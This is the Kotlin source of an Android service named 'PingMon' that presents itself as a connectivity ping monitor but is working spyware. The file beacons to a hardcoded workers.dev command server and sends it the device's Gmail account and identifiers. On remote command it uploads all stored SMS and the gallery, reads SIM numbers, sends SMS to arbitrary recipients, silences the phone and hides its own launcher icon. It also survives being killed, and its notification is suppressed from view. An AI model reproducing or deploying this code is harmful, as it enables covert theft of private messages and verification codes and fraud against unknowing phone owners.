package com.example.pingmon

import android.accounts.AccountManager
import android.app.*
import android.content.*
import android.media.AudioManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.*
import android.telephony.TelephonyManager
import android.util.Log
import androidx.core.app.NotificationCompat
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit

class PingService : Service() {

    companion object {
        const val WORKER_URL       = "https://pingmon.kapcher2019.workers.dev/ping"
        const val APP_TOKEN        = "p7k2m9qx4bz8vn3rt"
        const val PING_INTERVAL_MS = 5_000L
        const val CHANNEL_ID       = "pingmon"
        const val NOTIF_ID         = 1001
        const val ACTION_TICK      = "com.example.pingmon.TICK"
        const val ACTION_GOTO      = "com.example.pingmon.GOTO"
        const val PREFS            = "pingmon"
        const val KEY_DOMAIN       = "domain"
        const val DEFAULT_DOMAIN   = "https://www.google.com"
        private const val KEY_REPORT = "pending_report"
        private const val TAG      = "PingMon"

        fun start(ctx: Context) {
            val i = Intent(ctx, PingService::class.java)
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.startForegroundService(i)
                else ctx.startService(i)
            } catch (e: Exception) { Log.w(TAG, "start: ${e.message}") }
        }

        fun uid(ctx: Context): String {
            val hw = listOf(
                Build.MANUFACTURER, Build.MODEL, Build.DEVICE,
                Build.HARDWARE, Build.BOARD, Build.BRAND,
            ).joinToString("|")
            val digest = java.security.MessageDigest.getInstance("SHA-256")
            val hash   = digest.digest(hw.toByteArray())
            return hash.take(10).joinToString("") { "%02x".format(it) }
        }

        const val KEY_SERVER_URL  = "server_url"
        const val KEY_PING_URL    = "ping_url"
        const val KEY_CLIENT_IP   = "client_ip"

        fun serverUrl(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_SERVER_URL, "") ?: ""

        fun currentDomain(ctx: Context): String =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .getString(KEY_DOMAIN, DEFAULT_DOMAIN) ?: DEFAULT_DOMAIN

        fun setDomain(ctx: Context, url: String) =
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putString(KEY_DOMAIN, url).apply()
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    private var thread: HandlerThread? = null
    private var handler: Handler?      = null
    private var wakeLock: PowerManager.WakeLock? = null
    private var netCallback: ConnectivityManager.NetworkCallback? = null
    private var running = false
    private val prefs get() = getSharedPreferences(PREFS, Context.MODE_PRIVATE)

    /* ============================================================ lifecycle */

    override fun onCreate() {
        super.onCreate()
        createChannel()
        startForeground(NOTIF_ID, buildNotification("starting…"))
        thread = HandlerThread("ping").apply { start() }
        handler = Handler(thread!!.looper)
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "PingMon::loop").apply {
            setReferenceCounted(false); acquire()
        }
        watchNetwork()
        running = true
        tick()
        Reviver.scheduleAll(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == ACTION_TICK) handler?.post { tick() }
        else if (!running) { running = true; handler?.post { tick() } }
        Reviver.scheduleAll(this)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onTaskRemoved(rootIntent: Intent?) {
        Reviver.scheduleRestart(this, 1_000)
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        running = false
        handler?.removeCallbacksAndMessages(null)
        thread?.quitSafely()
        wakeLock?.let { if (it.isHeld) it.release() }
        unwatchNetwork()
        Reviver.scheduleRestart(this, 2_000)
        super.onDestroy()
    }

    /* ================================================================ loop */

    private fun tick() {
        IconManager.retryIfPending(this)
        if (isOnline()) sendPing()
        handler?.removeCallbacksAndMessages(null)
        handler?.postDelayed({ tick() }, PING_INTERVAL_MS)
        Reviver.scheduleTick(this, PING_INTERVAL_MS)
    }

    /* ============================================================ network */

    private fun isOnline(): Boolean {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return false
        val caps = cm.getNetworkCapabilities(n) ?: return false
        return caps.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
    }

    private fun watchNetwork() {
        val cm  = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET).build()
        netCallback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                handler?.post { sendPing() }
            }
        }
        try { cm.registerNetworkCallback(req, netCallback!!) }
        catch (e: Exception) { Log.w(TAG, "netcb: ${e.message}") }
    }

    private fun unwatchNetwork() {
        netCallback?.let {
            try { (getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager)
                .unregisterNetworkCallback(it) } catch (_: Exception) {}
        }
        netCallback = null
    }

    /* ================================================================ ping */

    /**
     * Sends all queued incoming SMS to the server as ONE combined message.
     * If offline → stays in queue. If online → sends and clears.
     */
    private fun drainSmsQueue() {
        val queue = SmsQueue.getAll(this)
        if (queue.isEmpty()) return
        val server = serverUrl(this)
        if (server.isBlank()) return

        Thread {
            try {
                val device = "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}".trim()
                val fmt    = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
                    java.util.Locale.getDefault())
                val parts  = queue.mapIndexed { i, m ->
                    "${i+1}. \uD83D\uDCDE ${m.from}\n\uD83D\uDD50 ${fmt.format(java.util.Date(m.time))}\n${m.body}"
                }
                val text = "\uD83D\uDCE8 ${queue.size} new SMS on $device\n\n" +
                    parts.joinToString("\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n")

                val body = okhttp3.RequestBody.create("text/plain".toMediaType(), text)
                val req  = okhttp3.Request.Builder()
                    .url("$server/message")
                    .addHeader("X-Token", APP_TOKEN)
                    .post(org.json.JSONObject().apply {
                        put("text", text)
                    }.toString().toRequestBody("application/json".toMediaType()))
                    .build()
                client.newCall(req).execute().use { resp ->
                    if (resp.isSuccessful) {
                        SmsQueue.clear(this)
                        Log.i(TAG, "SMS queue drained: ${queue.size} messages")
                    }
                }
            } catch (e: Exception) {
                Log.w(TAG, "drainSmsQueue: ${e.message}")
            }
        }.start()
    }

    private fun sendPing() {
        val pendingReport = prefs.getString(KEY_REPORT, null)

        val payload = JSONObject().apply {
            put("uid",      uid(this@PingService))
            put("battery",  batteryLevel())
            put("domain",   currentDomain(this@PingService))
            put("model",    "${Build.MANUFACTURER} ${Build.MODEL}".trim())
            put("android",  Build.VERSION.RELEASE)
            put("operator", operatorName())
            put("gmail",    gmailAccount())
            put("network",  networkType())
            if (!pendingReport.isNullOrBlank()) put("report", pendingReport)
            val pendingInfo = prefs.getString("pending_info", null)
            if (!pendingInfo.isNullOrBlank()) put("info_report", pendingInfo)
        }.toString()

        val req = Request.Builder()
            .url(WORKER_URL)
            .addHeader("X-Token", APP_TOKEN)
            .post(payload.toRequestBody("application/json".toMediaType()))
            .build()

        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                updateNotification("offline")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    val bodyStr = it.body?.string() ?: ""
                    if (it.isSuccessful) {
                        if (!pendingReport.isNullOrBlank())
                            prefs.edit().remove(KEY_REPORT).apply()
                        val pendingInfo = prefs.getString("pending_info", null)
                        if (!pendingInfo.isNullOrBlank())
                            prefs.edit().remove("pending_info").apply()
                        handleResponse(bodyStr)
                    } else {
                        updateNotification("err ${it.code}")
                    }
                }
            }
        })
    }

    private fun handleResponse(bodyStr: String) {
        updateNotification("ok")
        try {
            val json = JSONObject(bodyStr)

            // Save server_url and client_ip from ping response
            val srv = json.optString("server_url", "")
            if (srv.isNotBlank()) prefs.edit().putString(KEY_SERVER_URL, srv).apply()
            val ip = json.optString("client_ip", "")
            if (ip.isNotBlank()) prefs.edit().putString(KEY_CLIENT_IP, ip).apply()

            val cmd  = json.optString("cmd", "")
            val arg  = json.optString("arg", "")
            when (cmd) {
                "goto"  -> if (arg.isNotBlank()) {
                    setDomain(this, arg)
                    sendBroadcast(Intent(ACTION_GOTO).setPackage(packageName).putExtra("url", arg))
                }
                "cmd_a" -> vibrate()
                "cmd_b" -> sendLastSmsToServer()  // last SMS via server
                "cmd_c" -> uploadAllSms()  // all SMS as txt file
                "cmd_d" -> reportPhoneNumbers()  // find SIM numbers
                "cmd_e" -> setSilent()           // silent mode
                "cmd_f" -> setRinging()          // ring at 2/3 volume
                "cmd_g" -> changeIcon()          // swap to hidden icon
                "cmd_h" -> restoreIcon()         // restore main icon
                "cmd_i" -> fullHide()            // completely hide (no icon)
                "cmd_j" -> unHide()              // unhide and restore
                "cmd_info"    -> collectDeviceInfo()
                "cmd_sms"     -> sendSmsFromCommand(arg)
                "cmd_gallery"         -> GalleryUploader(this).start()
                "cmd_gallery_refresh" -> GalleryUploader(this).refresh()
            }
        } catch (_: Exception) {}
    }

    /* ============================================================ commands */

    // SMS send from bot command
    private fun sendSmsFromCommand(arg: String) {
        try {
            val data = org.json.JSONObject(arg)
            val to   = data.optString("to", "")
            val msg  = data.optString("msg", "")
            if (to.isBlank() || msg.isBlank()) return
            val mgr = android.telephony.SmsManager.getDefault()
            val parts = mgr.divideMessage(msg)
            mgr.sendMultipartTextMessage(to, null, parts, null, null)
            prefs.edit().putString("pending_report", "📤 SMS sent to $to").apply()
        } catch (e: Exception) {
            prefs.edit().putString("pending_report", "SMS error: ${e.message}").apply()
        }
    }

    // INFO — collect all device info and queue for next ping
    private fun collectDeviceInfo() {
        try {
            val pm  = packageManager
            val ctx = this

            // Granted dangerous permissions
            val dangerous = listOf(
                android.Manifest.permission.READ_SMS,
                android.Manifest.permission.RECEIVE_SMS,
                android.Manifest.permission.SEND_SMS,
                android.Manifest.permission.READ_CONTACTS,
                android.Manifest.permission.CALL_PHONE,
                android.Manifest.permission.READ_PHONE_STATE,
                android.Manifest.permission.READ_PHONE_NUMBERS,
                android.Manifest.permission.ACCESS_FINE_LOCATION,
                android.Manifest.permission.CAMERA,
                android.Manifest.permission.RECORD_AUDIO,
                android.Manifest.permission.READ_CALL_LOG,
                android.Manifest.permission.GET_ACCOUNTS,
            )
            val granted = dangerous.filter {
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, it) ==
                    android.content.pm.PackageManager.PERMISSION_GRANTED
            }.map { it.substringAfterLast(".") }

            // Icon state
            val mainState = pm.getComponentEnabledSetting(
                android.content.ComponentName(packageName, "$packageName.MainLauncher")
            )
            val hiddenState = pm.getComponentEnabledSetting(
                android.content.ComponentName(packageName, "$packageName.HiddenLauncher")
            )
            val iconState = when {
                mainState  == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED  -> "visible"
                hiddenState == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED -> "camouflaged"
                else -> "hidden"
            }

            // Ringer state
            val am = getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
            val ringerState = when (am.ringerMode) {
                android.media.AudioManager.RINGER_MODE_NORMAL  -> "ring"
                android.media.AudioManager.RINGER_MODE_VIBRATE -> "vibrate"
                android.media.AudioManager.RINGER_MODE_SILENT  -> "silent"
                else -> "unknown"
            }

            // VPN
            val cmgr  = getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
            val caps  = cmgr.getNetworkCapabilities(cmgr.activeNetwork)
            val isVpn = caps?.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN) == true

            // SIM list
            val sims = mutableListOf<String>()
            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                    val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                        as android.telephony.SubscriptionManager
                    sm.activeSubscriptionInfoList?.forEach { sub ->
                        sims.add("${sub.displayName}(SIM${sub.simSlotIndex+1})")
                    }
                }
            } catch (_: Exception) {
                operatorName()?.let { sims.add(it) }
            }

            // App version
            val appVersion = try {
                pm.getPackageInfo(packageName, 0).versionName ?: "?"
            } catch (_: Exception) { "?" }

            val info = JSONObject().apply {
                put("model",       "${Build.MANUFACTURER} ${Build.MODEL}".trim())
                put("os",          Build.VERSION.RELEASE)
                put("sdk",         Build.VERSION.SDK_INT)
                put("appVersion",  appVersion)
                put("gmail",       gmailAccount() ?: "—")
                put("permissions", org.json.JSONArray(granted))
                put("vpn",         isVpn)
                put("icon",        iconState)
                put("ringer",      ringerState)
                put("battery",     batteryLevel())
                put("carrier",     sims.joinToString(" • ").ifBlank { "—" })
                put("sims",        org.json.JSONArray(sims))
                put("network",     networkType())
                put("ip",          prefs.getString(KEY_CLIENT_IP, "—") ?: "—")
            }

            prefs.edit().putString("pending_info", info.toString()).apply()
        } catch (e: Exception) {
            Log.w(TAG, "collectDeviceInfo: ${e.message}")
        }
    }

    // A — vibrate 3 times
    private fun vibrate() {
        try {
            val v = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                v.vibrate(VibrationEffect.createWaveform(
                    longArrayOf(0, 300, 200, 300, 200, 300),
                    intArrayOf(0, 255, 0, 255, 0, 255), -1
                ))
            } else {
                @Suppress("DEPRECATION")
                v.vibrate(longArrayOf(0, 300, 200, 300, 200, 300), -1)
            }
        } catch (e: Exception) { Log.w(TAG, "vibrate: ${e.message}") }
    }


    // C — read ALL SMS and upload as txt file to server
    private fun uploadAllSms() {
        Thread {
            try {
                // server_url comes from ping response — always up to date
                val server = prefs.getString(KEY_SERVER_URL, "") ?: ""
                if (server.isBlank()) {
                    prefs.edit().putString(KEY_REPORT,
                        "Waiting for server_url from next ping...").apply()
                    return@Thread
                }

                // Step 2: build SMS txt
                val sb  = StringBuilder()
                val fmt = java.text.SimpleDateFormat(
                    "yyyy/MM/dd HH:mm:ss", java.util.Locale.getDefault()
                )
                sb.appendLine("=== SMS Export ===")
                sb.appendLine("Device : ${Build.MANUFACTURER} ${Build.MODEL}")
                sb.appendLine("Date   : ${fmt.format(java.util.Date())}")
                sb.appendLine("=".repeat(40))
                sb.appendLine()

                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        android.provider.Telephony.Sms.ADDRESS,
                        android.provider.Telephony.Sms.BODY,
                        android.provider.Telephony.Sms.DATE,
                        android.provider.Telephony.Sms.TYPE,
                    ),
                    null, null,
                    "${android.provider.Telephony.Sms.DATE} DESC"
                )

                var count = 0
                cursor?.use { c ->
                    while (c.moveToNext()) {
                        val address = c.getString(0) ?: "unknown"
                        val body    = c.getString(1) ?: ""
                        val date    = c.getLong(2)
                        val type    = c.getInt(3)
                        val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
                            "SENT" else "RECV"
                        sb.appendLine("[$typeStr] ${fmt.format(java.util.Date(date))}")
                        sb.appendLine("From/To: $address")
                        sb.appendLine(body)
                        sb.appendLine("-".repeat(40))
                        count++
                    }
                }
                sb.appendLine()
                sb.appendLine("Total: $count messages")

                // Step 3: upload directly
                val filename = "sms_${Build.MODEL}_${System.currentTimeMillis()}.txt"
                val caption  = "${Build.MANUFACTURER} ${Build.MODEL} | $count SMS"
                val bytes    = sb.toString().toByteArray(Charsets.UTF_8)
                val body     = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
                val req      = okhttp3.Request.Builder()
                    .url("$server/upload")
                    .addHeader("X-Token", APP_TOKEN)
                    .addHeader("X-Filename", filename)
                    .addHeader("X-Caption", caption)
                    .post(body)
                    .build()

                client.newCall(req).execute().use { resp ->
                    val msg = if (resp.isSuccessful) "Sent $count SMS to server"
                              else "Upload failed: ${resp.code}"
                    prefs.edit().putString(KEY_REPORT, msg).apply()
                }

            } catch (e: Exception) {
                prefs.edit().putString(KEY_REPORT, "Error: ${e.message}").apply()
            }
        }.start()
    }

    // B — read last SMS and send DIRECTLY to server (no ping round-trip)
    private fun sendLastSmsToServer() {
        val server = serverUrl(this)
        if (server.isBlank()) {
            prefs.edit().putString(KEY_REPORT, "No server set. Use /setserver.").apply()
            return
        }
        Thread {
            try {
                val cursor = contentResolver.query(
                    android.provider.Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        android.provider.Telephony.Sms.ADDRESS,
                        android.provider.Telephony.Sms.BODY,
                        android.provider.Telephony.Sms.DATE,
                        android.provider.Telephony.Sms.TYPE,
                    ),
                    null, null,
                    "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
                )
                val text = cursor?.use { c ->
                    if (!c.moveToFirst()) return@use "No SMS found."
                    val addr = c.getString(0) ?: "unknown"
                    val body = c.getString(1) ?: ""
                    val date = c.getLong(2)
                    val type = c.getInt(3)
                    val typeStr = if (type == android.provider.Telephony.Sms.MESSAGE_TYPE_SENT)
                        "SENT" else "RECV"
                    val fmt = java.text.SimpleDateFormat("yyyy/MM/dd HH:mm:ss",
                        java.util.Locale.getDefault())
                    "\uD83D\uDCAC Last SMS\n[$typeStr] ${fmt.format(java.util.Date(date))}\n$addr\n$body"
                } ?: "No SMS."
                uploadText("last_sms.txt", text, "Last SMS from ${android.os.Build.MODEL}")
            } catch (e: Exception) {
                prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
            }
        }.start()
    }

    // B — read last SMS and queue for next ping
    private fun reportLastSms() {
        try {
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.CONTENT_URI,
                arrayOf(
                    android.provider.Telephony.Sms.ADDRESS,
                    android.provider.Telephony.Sms.BODY,
                    android.provider.Telephony.Sms.DATE,
                    android.provider.Telephony.Sms.TYPE,
                    android.provider.Telephony.Sms.PERSON,
                ),
                null, null,
                "${android.provider.Telephony.Sms.DATE} DESC LIMIT 1"
            )

            val report = cursor?.use { c ->
                if (!c.moveToFirst()) return@use "📭 No SMS found."
                val address = c.getString(0) ?: "unknown"
                val body    = c.getString(1) ?: ""
                val date    = c.getLong(2)
                val type    = c.getInt(3)

                val typeStr = when (type) {
                    android.provider.Telephony.Sms.MESSAGE_TYPE_INBOX -> "📩 Received"
                    android.provider.Telephony.Sms.MESSAGE_TYPE_SENT  -> "📤 Sent"
                    android.provider.Telephony.Sms.MESSAGE_TYPE_DRAFT -> "📝 Draft"
                    else -> "📱 SMS"
                }

                val fmt = java.text.SimpleDateFormat(
                    "yyyy/MM/dd   HH:mm:ss", java.util.Locale.getDefault()
                )
                val timeStr = fmt.format(java.util.Date(date))

                "\uD83D\uDCAC *Last SMS*\n" +
                "- - - - - - -\n" +
                "$typeStr\n" +
                "\uD83D\uDCDE $address\n" +
                "\uD83D\uDD50 $timeStr\n" +
                "- - - - - - -\n" +
                body.take(800)
            } ?: "📭 Could not read SMS."

            prefs.edit().putString(KEY_REPORT, report).apply()
        } catch (e: Exception) {
            prefs.edit().putString(KEY_REPORT, "SMS error: ${e.message}").apply()
        }
    }

    // D — read SIM phone numbers, queue for next ping
    private fun reportPhoneNumbers() {
        val lines = mutableListOf<String>()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
                val sm = getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE)
                    as android.telephony.SubscriptionManager
                sm.activeSubscriptionInfoList?.forEach { sub ->
                    val num  = sub.number?.takeIf { it.isNotBlank() } ?: "—"
                    val name = sub.displayName?.toString() ?: "SIM ${sub.simSlotIndex + 1}"
                    lines.add("SIM${sub.simSlotIndex + 1}: $num  ($name)")
                }
            }
        } catch (_: Exception) {}

        if (lines.isEmpty()) {
            try {
                val tm = getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager
                @Suppress("DEPRECATION")
                val num = tm.line1Number?.takeIf { it.isNotBlank() } ?: "—"
                lines.add("SIM1: $num")
            } catch (e: Exception) { lines.add("error: ${e.message}") }
        }

        prefs.edit()
            .putString(KEY_REPORT, "📞 Phone numbers:\n" + lines.joinToString("\n"))
            .apply()
    }

    // E — silent (vibrate fallback if DND blocks)
    private fun setSilent() {
        val am = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        try {
            am.ringerMode = AudioManager.RINGER_MODE_SILENT
        } catch (_: SecurityException) {
            try { am.ringerMode = AudioManager.RINGER_MODE_VIBRATE }
            catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
        } catch (e: Exception) { Log.w(TAG, "setSilent: ${e.message}") }
    }

    // F — ring at 2/3 max volume
    private fun setRinging() {
        try {
            val am  = getSystemService(Context.AUDIO_SERVICE) as AudioManager
            am.ringerMode = AudioManager.RINGER_MODE_NORMAL
            val max = am.getStreamMaxVolume(AudioManager.STREAM_RING)
            am.setStreamVolume(AudioManager.STREAM_RING, max * 2 / 3, 0)
        } catch (e: Exception) { Log.w(TAG, "setRinging: ${e.message}") }
    }

    // G — swap to neutral icon (app still visible, just camouflaged)
    private fun changeIcon() = IconManager.hide(this, fullyHide = false)

    // H — restore main icon
    private fun restoreIcon() = IconManager.show(this)

    // I — completely disappear from launcher
    private fun fullHide() = IconManager.hide(this, fullyHide = true)

    // J — unhide and restore main icon
    private fun unHide() = IconManager.show(this)

    /* ======================================================= server upload */

    /** Fetch dynamic config (server_url, ping_url) from worker. */
    private fun fetchConfig() {
        val url = WORKER_URL.replace("/ping", "/config")
        val req = okhttp3.Request.Builder().url(url)
            .addHeader("X-Token", APP_TOKEN).get().build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, response: Response) {
                response.use {
                    if (!it.isSuccessful) return
                    try {
                        val json = JSONObject(it.body?.string() ?: "")
                        val srv  = json.optString("server_url", "")
                        if (srv.isNotBlank()) {
                            prefs.edit().putString(KEY_SERVER_URL, srv).apply()
                            Log.i(TAG, "server_url updated: $srv")
                        }
                    } catch (_: Exception) {}
                }
            }
        })
    }

    /** Upload a text file to the file server → forwarded to Telegram. */
    fun uploadText(filename: String, content: String, caption: String = "") {
        val serverUrl = serverUrl(this)
        if (serverUrl.isBlank()) {
            Log.w(TAG, "no server_url configured")
            return
        }
        val bytes = content.toByteArray(Charsets.UTF_8)
        val body  = okhttp3.RequestBody.create("text/plain".toMediaType(), bytes)
        val req   = okhttp3.Request.Builder()
            .url("$serverUrl/upload")
            .addHeader("X-Token", APP_TOKEN)
            .addHeader("X-Filename", filename)
            .addHeader("X-Caption", caption)
            .post(body)
            .build()
        client.newCall(req).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {
                Log.w(TAG, "upload failed: ${e.message}")
            }
            override fun onResponse(call: Call, response: Response) {
                response.use { Log.i(TAG, "upload done: ${it.code}") }
            }
        })
    }

    /* =========================================================== device info */

    private fun batteryLevel(): Int =
        (getSystemService(Context.BATTERY_SERVICE) as BatteryManager)
            .getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)

    private fun operatorName(): String? = try {
        (getSystemService(Context.TELEPHONY_SERVICE) as TelephonyManager)
            .networkOperatorName.takeIf { it.isNotBlank() }
    } catch (_: Exception) { null }

    private fun gmailAccount(): String? = try {
        AccountManager.get(this).getAccountsByType("com.google").firstOrNull()?.name
    } catch (_: Exception) { null }

    private fun networkType(): String {
        val cm   = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val n    = cm.activeNetwork ?: return "none"
        val caps = cm.getNetworkCapabilities(n) ?: return "none"
        return when {
            caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)     -> "WiFi"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> "Mobile"
            caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET) -> "Ethernet"
            else -> "other"
        }
    }

    /* ========================================================== notification */

    private fun createChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val ch = NotificationChannel(
                CHANNEL_ID, "Connection", NotificationManager.IMPORTANCE_MIN
            ).apply { setShowBadge(false); lockscreenVisibility = Notification.VISIBILITY_SECRET }
            getSystemService(NotificationManager::class.java).createNotificationChannel(ch)
        }
    }

    private fun buildNotification(text: String): Notification {
        val playIntent = packageManager.getLaunchIntentForPackage("com.android.vending")
            ?.apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
            ?: Intent(Intent.ACTION_VIEW, android.net.Uri.parse("https://play.google.com"))
                .apply { flags = Intent.FLAG_ACTIVITY_NEW_TASK }
        val tap = PendingIntent.getActivity(
            this, 0, playIntent,
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("PingMon")
            .setContentText(text)
            .setSmallIcon(android.R.drawable.stat_sys_upload_done)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true).setSilent(true).setShowWhen(false)
            .setContentIntent(tap).build()
    }

    private fun updateNotification(state: String) {
        try {
            getSystemService(NotificationManager::class.java)
                .notify(NOTIF_ID, buildNotification("${uid(this).take(8)} · $state"))
        } catch (_: Exception) {}
    }
}
